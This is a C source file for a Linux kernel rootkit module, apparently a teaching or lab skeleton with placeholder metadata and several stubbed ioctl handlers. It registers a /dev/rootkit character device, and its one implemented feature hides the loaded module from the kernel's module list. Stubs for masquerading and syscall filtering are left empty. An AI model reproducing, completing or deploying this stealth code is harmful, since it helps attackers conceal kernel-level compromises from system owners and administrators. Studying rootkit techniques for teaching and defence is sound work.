#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

/* The rootkit module should be visible by default. */
static bool is_hidden = false;
static struct list_head *prev_module = NULL;

static void toggle_module_visibility(void) {
    if (is_hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        prev_module = NULL;
    } else {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    }
    is_hidden = !is_hidden;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        toggle_module_visibility();
        break;
    case IOCTL_MOD_MASQ:
        // do something
        break;
    case IOCTL_ADD_FILTER:
        // do something
        break;
    case IOCTL_REMOVE_FILTER:
        // do something
        break;
    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    return 0;
}

static void __exit rootkit_exit(void) {
    // TODO: unhook syscall and cleanup syscall filter list

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
